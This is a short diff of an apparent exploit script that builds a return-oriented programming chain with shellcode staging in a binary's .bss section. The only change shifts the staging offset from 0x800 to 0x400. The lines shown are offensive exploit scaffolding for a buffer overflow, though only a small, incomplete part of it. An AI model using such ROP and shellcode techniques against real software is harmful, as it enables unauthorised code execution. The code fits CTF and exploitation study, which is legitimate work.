@@ -5,7 +5,7 @@ offset = int(sys.argv[2])
 
 rop = ROP(fpath)
 sc = Shellcode('x86-64')
-addr_stage = rop.section('.bss') + 0x800
+addr_stage = rop.section('.bss') + 0x400
 
 buf = rop.fill(offset)
 buf += rop.call_chain_plt(
